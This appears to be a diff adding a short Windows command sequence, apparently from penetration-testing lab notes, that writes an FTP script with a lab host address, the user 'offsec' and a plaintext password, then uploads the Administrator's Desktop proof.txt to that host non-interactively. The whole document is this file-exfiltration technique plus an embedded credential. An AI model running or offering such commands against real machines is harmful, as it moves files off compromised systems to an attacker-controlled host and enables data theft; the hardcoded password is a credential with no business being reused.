@@ -1,0 +1,7 @@
+echo open 10.11.0.85 21 > ftp.txt
+echo user offsec >> ftp.txt
+echo Notb4igo >> ftp.txt
+echo bin >> ftp.txt
+echo put c:\"Documents and Settings"\Administrator\Desktop\proof.txt >> ftp.txt
+echo bye >> ftp.txt
+ftp -v -n -s:ftp.txt
